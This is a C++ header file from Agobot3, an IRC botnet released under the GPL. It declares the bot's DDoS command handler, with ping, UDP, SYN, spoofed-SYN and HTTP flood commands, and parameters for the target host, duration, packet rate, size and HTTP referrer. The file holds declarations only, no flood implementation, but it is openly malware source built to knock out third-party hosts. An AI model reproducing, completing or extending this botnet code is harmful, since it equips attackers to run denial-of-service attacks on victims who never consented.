/*	Agobot3 - a modular IRC bot for Win32 / Linux
	Copyright (C) 2003 Ago

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. */

#ifndef __DDOS_H__
#define __DDOS_H__

#include "cstring.h"
#include "commands.h"
#include "message.h"
#include "cthread.h"

class CDDOS : public CCommandHandler
{
public:
	void Init();

	bool HandleCommand(CMessage *pMsg);
	
	command		 m_cmdPing, m_cmdUDP,m_cmdSyn,m_cmdSdSyn, m_cmdHTTP, m_cmdStop;
	int			 m_iNumThreads;
	bool		 m_bDDOSing;
};

class CDDOSBase : public CThread
{
public:
	CDDOSBase() { }
	virtual ~CDDOSBase() { }
	virtual void *Run();

	virtual void StartDDOS()=NULL;

	CString		 m_sDDOSName;
	CString		 m_sReplyTo;

	CString		 m_sHost;		// The Host to DDOS
	int			 m_iTime;		// Number of seconds DDOS is running
	int			 m_iDelay;		// Packet Delay
	int			 m_iPort;		// Port number / 0 for random
	int			 m_iNumber;		// Number of Packets
	int			 m_iSize;		// Size of Packets
	CString		 m_sURL;		// URL for HTTP flood
	CString		 m_sReferrer;	// URL for HTTP flood referrer
	bool		 m_bRecursive;	// Recursive option for HTTP flood

	bool		 m_bSilent;
	bool		 m_bNotice;

	CDDOS		*m_pDDOS;
};

#endif // __DDOS_H__
